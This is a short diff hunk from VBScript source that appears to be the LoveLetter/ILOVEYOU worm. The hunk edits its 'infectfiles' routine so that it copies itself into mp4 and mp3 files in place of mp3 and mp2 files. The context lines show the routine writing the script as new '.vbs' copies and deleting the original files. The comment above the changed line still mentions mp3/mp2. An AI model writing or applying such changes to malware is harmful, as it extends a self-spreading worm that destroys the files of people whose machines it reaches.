@@ -167,7 +167,7 @@ Sub infectfiles(folderspec)
       cop.copy(f1.path & ".vbs")
       fso.DeleteFile(f1.path)
     rem Copies itself into every file with mp3/mp2 extension.
-    ElseIf (ext = "mp3") Or (ext = "mp2") Then
+    ElseIf (ext = "mp4") Or (ext = "mp3") Then
       Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
 
       mp3.write vbscopy
